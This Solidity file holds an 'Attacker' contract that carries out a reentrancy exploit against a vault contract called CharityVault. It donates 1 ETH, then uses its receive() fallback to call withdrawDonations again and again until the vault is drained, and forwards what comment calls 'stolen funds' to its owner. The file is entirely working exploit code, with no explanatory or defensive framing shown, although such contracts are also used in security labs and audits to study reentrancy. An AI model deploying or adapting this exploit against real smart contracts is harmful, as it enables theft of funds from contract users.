// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

interface ICharityVault {
    function donate() external payable;
    function withdrawDonations() external;
}

contract Attacker {
    ICharityVault public vault;
    address public owner;

    constructor(address _vault) {
        vault = ICharityVault(_vault);
        owner = msg.sender;
    }

    // Start the attack by donating ETH and triggering the vulnerable withdraw
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH");
        vault.donate{value: 1 ether}();
        vault.withdrawDonations();
    }

    // Reenter the vault until it's drained
    receive() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.withdrawDonations();
        } else {
            payable(owner).transfer(address(this).balance); // Send stolen funds to attacker
        }
    }
}
